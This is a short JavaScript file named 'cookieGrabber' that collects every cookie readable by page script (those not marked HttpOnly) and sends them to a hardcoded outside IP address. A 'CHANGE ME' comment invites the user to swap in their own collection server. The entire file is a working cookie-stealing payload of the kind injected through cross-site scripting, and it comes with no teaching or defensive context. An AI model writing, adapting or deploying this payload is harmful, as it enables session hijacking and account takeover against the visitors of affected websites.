/**
 *  cookieGrabber
 * 
 *  A function that sends all cookies not protected by HttpOnly via an XMLHttpRequest
 *  to the provided URL.
 */

// Construct the payload to send to the server
var url = 'https://180.148.84.86/'; // CHANGE ME
var payload = '?cookies=' + document.cookie;

// Construct and send the request
var xmlHttp = new XMLHttpRequest();
xmlHttp.open("GET", url + payload, true);
xmlHttp.send();
